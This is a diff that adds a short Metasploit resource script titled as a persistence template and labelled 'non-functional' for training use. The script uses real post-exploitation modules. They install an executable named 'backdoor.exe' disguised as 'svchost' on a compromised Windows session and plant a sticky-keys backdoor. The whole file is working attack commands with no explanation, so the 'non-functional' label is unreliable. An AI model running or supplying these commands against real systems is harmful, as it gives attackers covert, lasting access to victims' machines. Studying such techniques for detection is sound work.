@@ -1,0 +1,12 @@
+# Persistence Template
+# For Training Use – Non-functional Template
+
+use post/windows/manage/persistence_exe
+set SESSION 1
+set REXEPATH /tmp/backdoor.exe
+set REXENAME svchost
+run
+
+use post/windows/manage/sticky_keys
+set SESSION 1
+run
